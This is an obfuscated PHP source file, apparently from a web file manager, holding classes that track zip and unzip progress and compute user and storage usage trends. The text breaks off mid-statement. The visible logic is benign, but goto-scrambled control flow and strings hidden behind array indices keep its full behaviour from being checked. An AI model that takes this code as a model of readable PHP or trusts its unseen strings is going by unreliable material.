<?php
 goto fÀóİ×ÇÒó; c’÷¡â¡‰: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fÖªÊ­èš; fÖªÊ­èš: $B³ô£œ³› =& $_SERVER[«¾°Ã¤]; parent::startAfter(); Hook::bind($B³ô£œ³›[1611], array($this, $B³ô£œ³›[1612])); goto aî§­×êÚ; C†£äĞ ¯¹: if (!$fÀç”Íâ—ê[$B³ô£œ³›[1434]]) { $fÀç”Íâ—ê[$B³ô£œ³›[1434]] = LNG($B³ô£œ³›[1615]); } goto A‹Ş¹ù÷¾ò; aî§­×êÚ: Hook::bind($B³ô£œ³›[1090], array($this, $B³ô£œ³›[1613])); $fÀç”Íâ—ê =& $this->task; $fÀç”Íâ—ê[$B³ô£œ³›[1614]] = $B³ô£œ³›[1095]; goto C†£äĞ ¯¹; A‹Ş¹ù÷¾ò: } protected function endAfter() { $aØƒÓæ…Ú =& $_SERVER[«¾°Ã¤]; parent::endAfter(); Hook::unbind($aØƒÓæ…Ú[1611], array($this, $aØƒÓæ…Ú[1612])); Hook::unbind($aØƒÓæ…Ú[1090], array($this, $aØƒÓæ…Ú[1613])); } public function updateAfter() { $C°çİàî½ó =& $_SERVER[«¾°Ã¤]; $cº‰¦´òíî =& $this->task; if (!$cº‰¦´òíî[$C°çİàî½ó[1022]] || !$cº‰¦´òíî[$C°çİàî½ó[732]]) { return; } if ($cº‰¦´òíî[$C°çİàî½ó[1614]] == $C°çİàî½ó[1095]) { $a˜êÉÙÄÜµ = 0; if ($cº‰¦´òíî[$C°çİàî½ó[1573]]) { $a˜êÉÙÄÜµ = $cº‰¦´òíî[$C°çİàî½ó[1574]] / $cº‰¦´òíî[$C°çİàî½ó[1573]]; } $cº‰¦´òíî[$C°çİàî½ó[1530]] = $a˜êÉÙÄÜµ * 0.3; } else { if ($cº‰¦´òíî[$C°çİàî½ó[1614]] == $C°çİàî½ó[311]) { $a˜êÉÙÄÜµ = $cº‰¦´òíî[$C°çİàî½ó[1037]] / $cº‰¦´òíî[$C°çİàî½ó[1022]]; $cº‰¦´òíî[$C°çİàî½ó[1530]] = 0.3 + $a˜êÉÙÄÜµ * 0.4; } else { if ($cº‰¦´òíî[$C°çİàî½ó[1614]] == $C°çİàî½ó[107]) { $báùƒ´¦«ù = 0; if ($cº‰¦´òíî[$C°çİàî½ó[1575]] == $C°çİàî½ó[107]) { $báùƒ´¦«ù = $cº‰¦´òíî[$C°çİàî½ó[1574]]; } $a˜êÉÙÄÜµ = ($cº‰¦´òíî[$C°çİàî½ó[1578]] + $báùƒ´¦«ù) / $cº‰¦´òíî[$C°çİàî½ó[732]]; $cº‰¦´òíî[$C°çİàî½ó[1530]] = 0.3 + 0.4 + $a˜êÉÙÄÜµ * 0.3; } } } if ($cº‰¦´òíî[$C°çİàî½ó[1530]] > 0) { $bÒÎÚ³Âç® = timeFloat() - $cº‰¦´òíî[$C°çİàî½ó[758]] - $cº‰¦´òíî[$C°çİàî½ó[1533]]; $cº‰¦´òíî[$C°çİàî½ó[1534]] = $bÒÎÚ³Âç® * (1 - $cº‰¦´òíî[$C°çİàî½ó[1530]]) / $cº‰¦´òíî[$C°çİàî½ó[1530]]; } } public function addFile($aµ”ë‰ÛÇÌ) { goto d²ÍäáËÈƒ; EÚò®ƒ‹¥Ï: $D º«‰Ÿª[$E•²—¥ÏÎ¢[1022]] = 1; $bÍ²ŒäÂ¿ô = 0; $D º«‰Ÿª[$E•²—¥ÏÎ¢[1582]] = array($E•²—¥ÏÎ¢[1583] => $bÍ²ŒäÂ¿ô + 1, $E•²—¥ÏÎ¢[422] => $eó’àèòô[$E•²—¥ÏÎ¢[28]], $E•²—¥ÏÎ¢[76] => $eó’àèòô[$E•²—¥ÏÎ¢[76]], $E•²—¥ÏÎ¢[504] => $eó’àèòô[$E•²—¥ÏÎ¢[504]] ? $eó’àèòô[$E•²—¥ÏÎ¢[504]] : $eó’àèòô[$E•²—¥ÏÎ¢[76]]); goto a™Ìé³³š; D§—ÃÕ£”–: $D º«‰Ÿª[$E•²—¥ÏÎ¢[1024]] = $E•²—¥ÏÎ¢[1590]; $D º«‰Ÿª[$E•²—¥ÏÎ¢[1575]] = $E•²—¥ÏÎ¢[1095]; $D º«‰Ÿª[$E•²—¥ÏÎ¢[732]] = $eó’àèòô[$E•²—¥ÏÎ¢[78]]; goto EÚò®ƒ‹¥Ï; d›İÑõ›Å: $D º«‰Ÿª[$E•²—¥ÏÎ¢[1571]] = $eó’àèòô[$E•²—¥ÏÎ¢[28]]; $D º«‰Ÿª[$E•²—¥ÏÎ¢[1573]] = $eó’àèòô[$E•²—¥ÏÎ¢[78]]; $D º«‰Ÿª[$E•²—¥ÏÎ¢[1574]] = 0; goto D§—ÃÕ£”–; d²ÍäáËÈƒ: $E•²—¥ÏÎ¢ =& $_SERVER[«¾°Ã¤]; $D º«‰Ÿª =& $this->task; $eó’àèòô = IO::info($aµ”ë‰ÛÇÌ); goto d›İÑõ›Å; a™Ìé³³š: $this->update(); goto Cù‡§¹‡œ; Cù‡§¹‡œ: } public function unzipAfter($F×¥ÂœÌ’²) { goto bÀ‡ä¢À ƒ; bÀ‡ä¢À ƒ: $B÷•î™ŒÑƒ =& $_SERVER[«¾°Ã¤]; $dõŠ¤®ôÎ =& $this->task; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1614]] = $B÷•î™ŒÑƒ[107]; goto Bİõ»ß•÷”; BĞ¾‰£ç®: $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1571]] = $B÷•î™ŒÑƒ[33]; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1578]] = 0; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[732]] = $C¯Ì×­¨®[$B÷•î™ŒÑƒ[78]]; goto A¢áßÔº•; A¢áßÔº•: $this->update(); self::log($B÷•î™ŒÑƒ[1616] . json_encode(array($dõŠ¤®ôÎ, $C¯Ì×­¨®))); goto FÏá‰; Bİõ»ß•÷”: $C¯Ì×­¨® = IO::infoWithChildren($F×¥ÂœÌ’²); $A‚×â¯¢‚¥ = 0; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1582]] = array($B÷•î™ŒÑƒ[1583] => $A‚×â¯¢‚¥ + 1, $B÷•î™ŒÑƒ[422] => $C¯Ì×­¨®[$B÷•î™ŒÑƒ[28]], $B÷•î™ŒÑƒ[76] => $C¯Ì×­¨®[$B÷•î™ŒÑƒ[76]], $B÷•î™ŒÑƒ[504] => $C¯Ì×­¨®[$B÷•î™ŒÑƒ[504]] ? $C¯Ì×­¨®[$B÷•î™ŒÑƒ[504]] : $C¯Ì×­¨®[$B÷•î™ŒÑƒ[76]]); goto D¾—éƒª; D¾—éƒª: if ($C¯Ì×­¨®[$B÷•î™ŒÑƒ[29]] == $B÷•î™ŒÑƒ[193]) { $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1022]] = 1; } else { $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1022]] = $C¯Ì×­¨®[$B÷•î™ŒÑƒ[81]][$B÷•î™ŒÑƒ[79]]; } $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1024]] = $B÷•î™ŒÑƒ[33]; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1575]] = 0; goto b•ãö¨¡œ¤; b•ãö¨¡œ¤: $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1037]] = 0; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1573]] = 0; $dõŠ¤®ôÎ[$B÷•î™ŒÑƒ[1574]] = 0; goto BĞ¾‰£ç®; FÏá‰: } public function nameParse($A‰à‚ª²î˜) { goto AĞµÈéù™È; CĞµÀÛÛ: $this->update(); goto EªÁ ƒñ‹‡; AĞµÈéù™È: $Cä–ã‰ÉËè =& $_SERVER[«¾°Ã¤]; $a´ª³–µö¬ =& $this->task; if ($a´ª³–µö¬[$Cä–ã‰ÉËè[1614]] == $Cä–ã‰ÉËè[1095]) { $a´ª³–µö¬[$Cä–ã‰ÉËè[1614]] = $Cä–ã‰ÉËè[311]; $a´ª³–µö¬[$Cä–ã‰ÉËè[1578]] = 0; $a´ª³–µö¬[$Cä–ã‰ÉËè[732]] = 0; } goto fÖ“‹ºÉ„ ; fÖ“‹ºÉ„ : $AÚ–Ÿã—Ÿµ = get_path_this($A‰à‚ª²î˜); if (strstr($AÚ–Ÿã—Ÿµ, $Cä–ã‰ÉËè[95])) { $a´ª³–µö¬[$Cä–ã‰ÉËè[1037]] += 1; $a´ª³–µö¬[$Cä–ã‰ÉËè[1022]] += 1; } $a´ª³–µö¬[$Cä–ã‰ÉËè[1571]] = $A‰à‚ª²î˜; goto CĞµÀÛÛ; EªÁ ƒñ‹‡: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fì†„‡Ûœ‡ =& $_SERVER[«¾°Ã¤]; parent::startAfter(); Hook::bind($fì†„‡Ûœ‡[1617], array($this, $fì†„‡Ûœ‡[1612])); $AœÍ¾ğƒõƒ =& $this->task; $AœÍ¾ğƒõƒ[$fì†„‡Ûœ‡[1614]] = $fì†„‡Ûœ‡[1095]; if (!$AœÍ¾ğƒõƒ[$fì†„‡Ûœ‡[1434]]) { $AœÍ¾ğƒõƒ[$fì†„‡Ûœ‡[1434]] = LNG($fì†„‡Ûœ‡[1618]); } } protected function endAfter() { $aÑÄù”å³Ö =& $_SERVER[«¾°Ã¤]; parent::endAfter(); Hook::unbind($aÑÄù”å³Ö[1617], array($this, $aÑÄù”å³Ö[1612])); } public function updateAfter() { $CÀ¡ÊÂ²š¦ =& $_SERVER[«¾°Ã¤]; $BØˆ•¤½Á =& $this->task; if (!$BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1022]] || !$BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[732]]) { return; } if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1614]] == $CÀ¡ÊÂ²š¦[1095]) { $Eè‘‰Í¸Œ = $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1574]]; if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1575]] != $CÀ¡ÊÂ²š¦[1095]) { $Eè‘‰Í¸Œ = 0; } $a§ìì×ÚËÇ = ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1578]] + $Eè‘‰Í¸Œ) / $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[732]]; $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]] = $a§ìì×ÚËÇ * 0.3; } else { if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1614]] == $CÀ¡ÊÂ²š¦[311]) { $a§ìì×ÚËÇ = $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1037]] / $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1022]]; $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]] = 0.3 + $a§ìì×ÚËÇ * 0.5; } else { if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1614]] == $CÀ¡ÊÂ²š¦[107]) { $a§ìì×ÚËÇ = 0; if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1573]]) { $a§ìì×ÚËÇ = $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1574]] / $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1573]]; } $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]] = 0.3 + 0.5 + $a§ìì×ÚËÇ * 0.2; } } } if ($BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]] > 0) { $f‚ÎèÈğ¥¨ = timeFloat() - $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[758]] - $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1533]]; $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1534]] = $f‚ÎèÈğ¥¨ * (1 - $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]]) / $BØˆ•¤½Á[$CÀ¡ÊÂ²š¦[1530]]; } } public function copyFileStart($c›¦‘”´™³, $Fİ²¶’Š°Ç, $fÅÇµ†×é”, $fì±‚÷’šï, $B·ÇÙ°¼é¼, $Dğ²¢µ) { $EÍ‰˜ğ±Ô¦ =& $_SERVER[«¾°Ã¤]; parent::copyFileStart($c›¦‘”´™³, $Fİ²¶’Š°Ç, $fÅÇµ†×é”, $fì±‚÷’šï, $B·ÇÙ°¼é¼, $Dğ²¢µ); $cáöÔªŠ =& $this->task; if ($cáöÔªŠ[$EÍ‰˜ğ±Ô¦[1614]] == $EÍ‰˜ğ±Ô¦[311]) { $cáöÔªŠ[$EÍ‰˜ğ±Ô¦[1614]] = $EÍ‰˜ğ±Ô¦[107]; } $this->update(); } public function copyFileEnd($C©‚³Ñ—, $cìÍ¦ÉÌ¿, $d½Ğ·îË–¡, $aß‡Êê¼»÷, $EŒÊò´Ø‘ğ, $e×ò…Ğ¡ª³) { $DÙ¥¬ŞíÚ =& $_SERVER[«¾°Ã¤]; $eƒ¤Ñ… =& $this->task; $eƒ¤Ñ…[$DÙ¥¬ŞíÚ[1574]] = $eƒ¤Ñ…[$DÙ¥¬ŞíÚ[1573]]; $eƒ¤Ñ…[$DÙ¥¬ŞíÚ[1578]] += $eƒ¤Ñ…[$DÙ¥¬ŞíÚ[1573]]; $eƒ¤Ñ…[$DÙ¥¬ŞíÚ[1575]] = $DÙ¥¬ŞíÚ[33]; $this->update(); } public function nameParse($f–çÖ×ĞÄ) { $c§„×ó¥› =& $_SERVER[«¾°Ã¤]; $D¡ñÍŠÇÔ =& $this->task; if ($D¡ñÍŠÇÔ[$c§„×ó¥›[1037]] < $D¡ñÍŠÇÔ[$c§„×ó¥›[1022]]) { $c’“°¹Ú‘ = get_path_this($f–çÖ×ĞÄ); if (strstr($c’“°¹Ú‘, $c§„×ó¥›[95])) { $D¡ñÍŠÇÔ[$c§„×ó¥›[1037]] += 1; } } if ($D¡ñÍŠÇÔ[$c§„×ó¥›[1614]] == $c§„×ó¥›[1095]) { $D¡ñÍŠÇÔ[$c§„×ó¥›[1614]] = $c§„×ó¥›[311]; } $D¡ñÍŠÇÔ[$c§„×ó¥›[1571]] = $f–çÖ×ĞÄ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Bä¹ï‡×“¯) { $EãÕ¨ìå£Ù =& $_SERVER[«¾°Ã¤]; $c‘Ì¯£¸ğó = array($EãÕ¨ìå£Ù[571] => array($EãÕ¨ìå£Ù[29] => $EãÕ¨ìå£Ù[1619], $EãÕ¨ìå£Ù[271] => array($EãÕ¨ìå£Ù[222], $EãÕ¨ìå£Ù[734], $EãÕ¨ìå£Ù[1620], $EãÕ¨ìå£Ù[1621])), $EãÕ¨ìå£Ù[1622] => array($EãÕ¨ìå£Ù[29] => $EãÕ¨ìå£Ù[1623], $EãÕ¨ìå£Ù[271] => array($EãÕ¨ìå£Ù[222], $EãÕ¨ìå£Ù[732], $EãÕ¨ìå£Ù[1624], $EãÕ¨ìå£Ù[1625], $EãÕ¨ìå£Ù[1626]))); if (!isset($c‘Ì¯£¸ğó[$Bä¹ï‡×“¯])) { return !1; } $this->optionType = $c‘Ì¯£¸ğó[$Bä¹ï‡×“¯][$EãÕ¨ìå£Ù[29]]; $this->field = $c‘Ì¯£¸ğó[$Bä¹ï‡×“¯][$EãÕ¨ìå£Ù[271]]; return !0; } public function listData($DŠ·àïÏÁœ = false, $F·£×°çÉ = "\155\x6f\144\x69\x66\x79\x54\151\x6d\145", $fâ‡ÀØ««‡ = false) { return parent::listData($DŠ·àïÏÁœ, $F·£×°çÉ, $fâ‡ÀØ««‡); } public function trendList($b«¸·º¡„) { goto eòŠ’¡Êø¡; B³Äª¨Àğ: if (!isset($Cî‚·¶‘ÍÇ)) { $C¾ËŒŒøæ… = $b«¸·º¡„ == $FÆã‡÷Ñ×[571] ? $FÆã‡÷Ñ×[515] : $FÆã‡÷Ñ×[799]; $Cî‚·¶‘ÍÇ = Model($C¾ËŒŒøæ…)->min($FÆã‡÷Ñ×[194]); } $cÂğÊÚ³ÔÇ = $FÆã‡÷Ñ×[1629] . ucfirst($b«¸·º¡„); $D‰ğ ÅÁå = $this->dateList($Cî‚·¶‘ÍÇ); goto D“Ü…İÏº§; eòŠ’¡Êø¡: $FÆã‡÷Ñ× =& $_SERVER[«¾°Ã¤]; $f­á”•›³Ò = $this->listData(); if ($f­á”•›³Ò) { $F›ÎŒêá¬ = end($f­á”•›³Ò); $A¸¡ØÁĞ¸¡ = date($FÆã‡÷Ñ×[1627], strtotime($FÆã‡÷Ñ×[1628])); if ($F›ÎŒêá¬[$FÆã‡÷Ñ×[222]] == $A¸¡ØÁĞ¸¡) { return $f­á”•›³Ò; } $Cî‚·¶‘ÍÇ = strtotime($F›ÎŒêá¬[$FÆã‡÷Ñ×[222]]); } goto B³Äª¨Àğ; D“Ü…İÏº§: foreach ($D‰ğ ÅÁå as $A¸¡ØÁĞ¸¡) { $this->{$cÂğÊÚ³ÔÇ}($A¸¡ØÁĞ¸¡); } return $this->listData(); goto fëíÄÛœØÈ; fëíÄÛœØÈ: } private function dateList($EÒÎËªòéƒ) { $fªİ‘‹„„’ =& $_SERVER[«¾°Ã¤]; $A›ÇŒíÎÌÌ = $EÒÎËªòéƒ; $C¿…ÀÎòù¨ = strtotime($fªİ‘‹„„’[1628]); $AÙŸ¡¸ƒ¯  = array(); while ($A›ÇŒíÎÌÌ <= $C¿…ÀÎòù¨) { $AÙŸ¡¸ƒ¯ [] = date($fªİ‘‹„„’[1627], $A›ÇŒíÎÌÌ); $A›ÇŒíÎÌÌ = strtotime($fªİ‘‹„„’[1630], $A›ÇŒíÎÌÌ); } return $AÙŸ¡¸ƒ¯ ; } public function _recordUser($BÚÂÈ¨î¶œ = '') { goto Eµœ‰’‰²; eç‚âéº: $aâì¥Š½áÍ = array($dÃ¹¥”Š‹[194] => array($dÃ¹¥”Š‹[971], $FâòèáåÆ¥)); $f×“ÄÅ³ê“ = Model($dÃ¹¥”Š‹[515])->where($aâì¥Š½áÍ)->count($dÃ¹¥”Š‹[1529]); $aâì¥Š½áÍ[$dÃ¹¥”Š‹[194]] = array($dÃ¹¥”Š‹[331], array($AÁÖ¦”Ö, $FâòèáåÆ¥)); goto BÉÇÒ·’óÈ; B©İØÌÑ¢: $aë·¥òÑ = array($dÃ¹¥”Š‹[222] => $BÚÂÈ¨î¶œ, $dÃ¹¥”Š‹[734] => (int) $f×“ÄÅ³ê“, $dÃ¹¥”Š‹[1620] => (int) $BÛ›¥Ñ, $dÃ¹¥”Š‹[1621] => (int) $E§ãö’“† ); return $this->insert($aë·¥òÑ); goto fŒÅ‚ââ†ß; BÉÇÒ·’óÈ: $BÛ›¥Ñ = Model($dÃ¹¥”Š‹[515])->where($aâì¥Š½áÍ)->count($dÃ¹¥”Š‹[1529]); $aâì¥Š½áÍ[$dÃ¹¥”Š‹[29]] = $dÃ¹¥”Š‹[1633]; $E§ãö’“†  = Model($dÃ¹¥”Š‹[1634])->where($aâì¥Š½áÍ)->count($dÃ¹¥”Š‹[1635]); goto B©İØÌÑ¢; Eµœ‰’‰²: $dÃ¹¥”Š‹ =& $_SERVER[«¾°Ã¤]; $AÁÖ¦”Ö = strtotime(date($dÃ¹¥”Š‹[1631], strtotime($BÚÂÈ¨î¶œ))); $FâòèáåÆ¥ = strtotime(date($dÃ¹¥”Š‹[1632], strtotime($BÚÂÈ¨î¶œ))); goto eç‚âéº; fŒÅ‚ââ†ß: } public function _recordStore($Eºöóù·† = '') { goto aª³â‹‡‰Ô; aª³â‹‡‰Ô: $fš…‰¯èñğ =& $_SERVER[«¾°Ã¤]; $F­‹øĞŒ®Ü = strtotime(date($fš…‰¯èñğ[1632], strtotime($Eºöóù·†))); $d¢ã¦‡–š = array($fš…‰¯èñğ[194] => array($fš…‰¯èñğ[971], $F­‹øĞŒ®Ü)); goto F¡–—Ëµ»; a“”òñ¯È: $d¢ã¦‡–š[$fš…‰¯èñğ[413]] = 1; $aÄ Ñ•¢ó = Model($fš…‰¯èñğ[799])->where($d¢ã¦‡–š)->sum($fš…‰¯èñğ[78]); $d¢ã¦‡–š[$fš…‰¯èñğ[413]] = 2; goto Cµ•È­„±¸; Cµ•È­„±¸: $a–½ÊÜ Ó = Model($fš…‰¯èñğ[799])->where($d¢ã¦‡–š)->sum($fš…‰¯èñğ[78]); $EÉóÁŸœ‰ = array($fš…‰¯èñğ[222] => $Eºöóù·†, $fš…‰¯èñğ[732] => (int) $A­ª”ê’à§, $fš…‰¯èñğ[1624] => (int) $e¦—ÎÂ«ß, $fš…‰¯èñğ[1625] => (int) $aÄ Ñ•¢ó, $fš…‰¯èñğ[1626] => (int) $a–½ÊÜ Ó); return $this->insert($EÉóÁŸœ‰); goto a™Ä§°¶™Ñ; F¡–—Ëµ»: $e¦—ÎÂ«ß = Model($fš…‰¯èñğ[459])->where($d¢ã¦‡–š)->sum($fš…‰¯èñğ[78]); $d¢ã¦‡–š[$fš…‰¯èñğ[412]] = 0; $A­ª”ê’à§ = Model($fš…‰¯èñğ[799])->where($d¢ã¦‡–š)->sum($fš…‰¯èñğ[78]); goto a“”òñ¯È; a™Ä§°¶™Ñ: } public function trend($aç¡‡Òİ, $e¾—èÌ—À) { goto DØ­Ø½ˆ²; FÜãáŞ¹‚Ì: if ($c«…ç›® && $e¾—èÌ—À != $cé¹ó¹Ğ‚ä[1503]) { $E§ÃŠµâ£ = $c«…ç›®[0][$cé¹ó¹Ğ‚ä[222]]; $BÚà¶¦ï¤ = $this->validDate($e¾—èÌ—À, $E§ÃŠµâ£); $bÏ¯‹£Ç…å = array(); $B¦­·ÇÄÜã = array_to_keyvalue($c«…ç›®, $cé¹ó¹Ğ‚ä[222]); foreach ($BÚà¶¦ï¤ as $CÕ¸ÓÍšÍ) { if (isset($B¦­·ÇÄÜã[$CÕ¸ÓÍšÍ])) { $dÚƒŸ†å„¾ = $B¦­·ÇÄÜã[$CÕ¸ÓÍšÍ]; } else { $dÚƒŸ†å„¾ = end($c«…ç›®); $dÚƒŸ†å„¾[$cé¹ó¹Ğ‚ä[222]] = $CÕ¸ÓÍšÍ; if ($aç¡‡Òİ == $cé¹ó¹Ğ‚ä[571]) { $dÚƒŸ†å„¾[$cé¹ó¹Ğ‚ä[1620]] = $dÚƒŸ†å„¾[$cé¹ó¹Ğ‚ä[1621]] = 0; } } $bÏ¯‹£Ç…å[] = $dÚƒŸ†å„¾; } $c«…ç›® = $bÏ¯‹£Ç…å; } $bï›¹¢‚®À = array($cé¹ó¹Ğ‚ä[571] => array($cé¹ó¹Ğ‚ä[734] => LNG($cé¹ó¹Ğ‚ä[1636]), $cé¹ó¹Ğ‚ä[1620] => LNG($cé¹ó¹Ğ‚ä[1637]), $cé¹ó¹Ğ‚ä[1621] => LNG($cé¹ó¹Ğ‚ä[1638])), $cé¹ó¹Ğ‚ä[1622] => array($cé¹ó¹Ğ‚ä[732] => LNG($cé¹ó¹Ğ‚ä[1639]), $cé¹ó¹Ğ‚ä[1624] => LNG($cé¹ó¹Ğ‚ä[1640]), $cé¹ó¹Ğ‚ä[1625] => LNG($cé¹ó¹Ğ‚ä[1641]), $cé¹ó¹Ğ‚ä[1626] => LNG($cé¹ó¹Ğ‚ä[1642]))); $EîâñÚğÂÚ = array($cé¹ó¹Ğ‚ä[571] => $cé¹ó¹Ğ‚ä[1643], $cé¹ó¹Ğ‚ä[1622] => $cé¹ó¹Ğ‚ä[78]); goto c‹ŒŒŒ±¡İ; DØ­Ø½ˆ²: $cé¹ó¹Ğ‚ä =& $_SERVER[«¾°Ã¤]; if (!$this->init($aç¡‡Òİ)) { return !1; } $c«…ç›® = $this->trendList($aç¡‡Òİ); goto FÜãáŞ¹‚Ì; DíŠ‰¢˜ÕÁ: return $CšìÍ¦¬ßÕ; goto Eª˜ÓÌ–™; c‹ŒŒŒ±¡İ: if (empty($c«…ç›®)) { $CÕ¸ÓÍšÍ = date($cé¹ó¹Ğ‚ä[1627], strtotime($cé¹ó¹Ğ‚ä[1628])); $Fí®Â‘« = array($cé¹ó¹Ğ‚ä[222] => $CÕ¸ÓÍšÍ); foreach ($bï›¹¢‚®À[$aç¡‡Òİ] as $AÄ‹ËãªÍ => $AŸ£½§Æ“Š) { $Fí®Â‘«[$AÄ‹ËãªÍ] = 0; } $c«…ç›®[] = $Fí®Â‘«; } $CšìÍ¦¬ßÕ = array(); foreach ($c«…ç›® as $AŸ£½§Æ“Š) { if ($aç¡‡Òİ == $cé¹ó¹Ğ‚ä[1622] && $AŸ£½§Æ“Š[$cé¹ó¹Ğ‚ä[1624]] > $AŸ£½§Æ“Š[$cé¹ó¹Ğ‚ä[732]]) { $AŸ£½§Æ“Š[$cé¹ó¹Ğ‚ä[1624]] = $AŸ£½§Æ“Š[$cé¹ó¹Ğ‚ä[732]]; } foreach ($bï›¹¢‚®À[$aç¡‡Òİ] as $AÄ‹ËãªÍ => $E™‘ì™øí) { $dÚƒŸ†å„¾ = array($cé¹ó¹Ğ‚ä[222] => $AŸ£½§Æ“Š[$cé¹ó¹Ğ‚ä[222]], $cé¹ó¹Ğ‚ä[1434] => $E™‘ì™øí); $dÚƒŸ†å„¾[$EîâñÚğÂÚ[$aç¡‡Òİ]] = isset($AŸ£½§Æ“Š[$AÄ‹ËãªÍ]) ? $AŸ£½§Æ“Š[$AÄ‹ËãªÍ] : 0; $CšìÍ¦¬ßÕ[] = $dÚƒŸ†å„¾; } } goto DíŠ‰¢˜ÕÁ; Eª˜ÓÌ–™: } public function validDate($d˜ÚƒÕ¾ïÊ, $FÆß†œ‚Ó®) { goto e¾…–£ÕÙˆ; b«ØìâÇä: return $f§í‹„™°ò; goto däÒ‡Åˆ½Ù; DäÕ£íé²Î: switch ($d˜ÚƒÕ¾ïÊ) { case $FŒÚòÂÈèá[1510]: $EŸÌ‚ª„¦ì = mktime(0, 0, 0, date($FŒÚòÂÈèá[1644]), date($FŒÚòÂÈèá[1254]) - date($FŒÚòÂÈèá[1316]) + 7 - 7, date($FŒÚòÂÈèá[1645])); $CáùÌ¼äà = 0; do { $EïÚ ·¢‰‡ = date($FŒÚòÂÈèá[1627], $EŸÌ‚ª„¦ì - 3600 * 24 * 7 * $CáùÌ¼äà); $f§í‹„™°ò[] = $EïÚ ·¢‰‡; $CáùÌ¼äà++; } while ($FÆß†œ‚Ó® < $EïÚ ·¢‰‡); break; case $FŒÚòÂÈèá[1508]: $CáùÌ¼äà = 1; do { $Dî”‹ëÒŞº = date($FŒÚòÂÈèá[1646], strtotime("\x2d\40{$CáùÌ¼äà}\40\155\x6f\x6e\x74\x68\x73")); $f§í‹„™°ò[] = $Dî”‹ëÒŞº; $CáùÌ¼äà++; } while ($FÆß†œ‚Ó® < $Dî”‹ëÒŞº); break; case $FŒÚòÂÈèá[1647]: $f˜¬ù«è¡ = (int) date($FŒÚòÂÈèá[1645], strtotime($FÆß†œ‚Ó®)); $eÜ» –Şè = (int) date($FŒÚòÂÈèá[1645]); if ($f˜¬ù«è¡ >= $eÜ» –Şè) { break; } for ($f˜¬ù«è¡; $f˜¬ù«è¡ < $eÜ» –Şè; $f˜¬ù«è¡++) { $f§í‹„™°ò[] = $f˜¬ù«è¡ . $FŒÚòÂÈèá[1648]; } break; default: break; } if ($FÆß†œ‚Ó® > end($f§í‹„™°ò)) { array_pop($f§í‹„™°ò); } sort($f§í‹„™°ò); goto b«ØìâÇä; e¾…–£ÕÙˆ: $FŒÚòÂÈèá =& $_SERVER[«¾°Ã¤]; $d‚ëåĞ©Ü¼ = date($FŒÚòÂÈèá[1627], strtotime($FŒÚòÂÈèá[1628])); $f§í‹„™°ò = array($d‚ëåĞ©Ü¼); goto DäÕ£íé²Î; däÒ‡Åˆ½Ù: } public function listTable($A˜®Üí”õ–) { $FÔ‡ĞÅÂ·ˆ = ucfirst($A˜®Üí”õ–); return Model($FÔ‡ĞÅÂ·ˆ)->listData(); } public function option($dÄ¨Ë‚·‡Æ) { $B„áŠµˆŸ¼ = $_SERVER[«¾°Ã¤][1649] . ucfirst($dÄ¨Ë‚·‡Æ); return $this->{$B„áŠµˆŸ¼}(); } private function optionUser() { goto Cä¸Ì œó…; EÁ‡Š¦Ûöİ: if (!$dÒŒ‘ÈÛµ¸) { $dÒŒ‘ÈÛµ¸ = 1; } $B§‹¤ì÷·ğ = array($B÷ö«¢øõ’[1651] => array($B÷ö«¢øõ’[972], $eØ÷·¨’ğì)); $E¸§êÏ¾ÜĞ = Model($B÷ö«¢øõ’[515])->where($B§‹¤ì÷·ğ)->count($B÷ö«¢øõ’[1529]); goto EêÃ«ÆÛö; EêÃ«ÆÛö: return array($B÷ö«¢øõ’[728] => (int) $eÂ´—àµäÔ, $B÷ö«¢øõ’[1652] => (int) ($eÂ´—àµäÔ - $A¨‰½Æ‚Ò), $B÷ö«¢øõ’[1653] => (int) $A¨‰½Æ‚Ò, $B÷ö«¢øõ’[1654] => (int) $E¸§êÏ¾ÜĞ, $B÷ö«¢øõ’[1655] => $dÒŒ‘ÈÛµ¸); goto böÁ©’Õ›»; Dóğ»ÓŞ–¦: $e‡§Å÷–‚Ÿ = intval($GLOBALS[$B÷ö«¢øõ’[6]][$B÷ö«¢øõ’[347]][$B÷ö«¢øõ’[1489]]) / 3600; $F’Ã–ôÆ½ë = strtotime("\55{$e‡§Å÷–‚Ÿ}\40\x68\x6f\x75\x72\x73"); $eØ÷·¨’ğì = strtotime(date($B÷ö«¢øõ’[1631])); goto fãÃÀ×ó§¡; fãÃÀ×ó§¡: if ($F’Ã–ôÆ½ë < $eØ÷·¨’ğì) { $F’Ã–ôÆ½ë = $eØ÷·¨’ğì; } $B§‹¤ì÷·ğ = 